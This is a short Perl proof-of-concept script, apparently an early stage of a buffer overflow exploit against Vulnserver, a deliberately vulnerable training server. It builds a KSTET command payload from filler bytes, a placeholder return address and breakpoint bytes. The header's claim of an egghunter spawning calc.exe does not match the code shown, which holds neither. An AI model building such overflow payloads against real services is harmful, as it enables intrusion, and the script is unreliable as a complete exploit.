#!/usr/bin/perl
# Vulnserver.exe bof poc spawn calc.exe using an egghunter
# Written by Wireghoul - http://www.justanotherhacker.com

$dist=70;
$EIP="AAAA";
$pad="\xcc" x 20;
$payload = "KSTET ";
$payload.="Z" x $dist;
$payload.="$EIP$pad\n";

print $payload;
